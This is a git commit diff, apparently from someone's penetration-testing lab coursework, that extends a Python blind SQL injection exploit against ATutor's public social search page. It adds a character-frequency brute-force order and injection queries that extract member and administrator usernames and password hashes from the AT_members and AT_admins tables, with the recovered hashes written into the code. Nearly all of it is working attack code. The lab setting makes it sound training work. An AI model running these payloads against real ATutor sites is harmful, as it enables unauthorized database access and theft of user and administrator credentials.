b188c6a5ef85e4d387852aceb520b90039c87e5c
dvdg6566 <czhdaniel@gmail.com>
2023-11-30 19:11:09 +0800

    Completed Chapter 3.6

--- labs/atutor/sqli.py
+++ labs/atutor/sqli.py
@@ -3,6 +3,10 @@ import re
 import requests
 from bs4 import BeautifulSoup
 
+ascii_list = list(range(48,57)) + list(range(97, 123)) + list(range(32,48)) + list(range(57,64)) + list(range(90,97)) + list(range(123,127)) + list(range(64,90))
+# List of characters in (rough) order of frequency
+# Numbers, small letters, punctuation, big letters (from 32 to 127)
+
 def searchFriends_custom(ip, inj_str):
     target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
     r = requests.get(target)
@@ -37,7 +41,7 @@ def extract(ip, inj):
     output = "" # If we already have stuff, can start output with value and change starting i
     for i in range(1,100):
         new_character = False
-        for c in range(32, 126): # ASCII letters, numbers and punctuation
+        for c in ascii_list: # ASCII letters, numbers and punctuation
             query_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))={c}%23"
             res = searchFriends_sqli(ip, query_string)
             print(f"Checking {chr(c)}: {query_string} -- {res}")
@@ -49,7 +53,7 @@ def extract(ip, inj):
         if not new_character:
             print("No possible characters, breaking now!")
             break
-    print(f"Version: {output}")
+    print(f"Extracted data: {output}")
     return output
 
 def main():
@@ -65,13 +69,28 @@ def main():
     false_injection_string = "aaaa')/**/or/**/(select/**/1)=0%23"
     
     user_injection_string = "select/**/CURRENT_USER()"
-    version_injection_string = "select/**/version()"
-
     # To extract the username (root@localhost):
     # extract(ip, user_injection_string)
 
+    version_injection_string = "select/**/version()"
     # To extract the version (5.5.47-0+deb8u1-log)
     # extract(ip, version_injection_string)
+
+    member_username_injection_string = "select/**/login/**/FROM/**/AT_members"
+    # member_username = extract(ip, member_username_injection_string)
+    member_username = "teacher"
+
+    memeber_password_injection_string = f"select/**/password/**/FROM/**/AT_members/**/WHERE/**/login=\"{member_username}\""
+    # member_hash = extract(ip, memeber_password_injection_string)
+    member_hash = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
+
+    admin_username_injection_string = "select/**/login/**/FROM/**/AT_admins"
+    # admin_username = extract(ip, admin_username_injection_string)
+    admin_username = "admin"
+
+    admin_password_injection_string = f"select/**/password/**/FROM/**/AT_admins/**/WHERE/**/login=\"{admin_username}\""
+    # admin_hash = extract(ip, admin_password_injection_string)
+    admin_hash = "f865b53623b121fd34ee5426c792e5c33af8c227"
 
 if __name__ == "__main__":
     main()
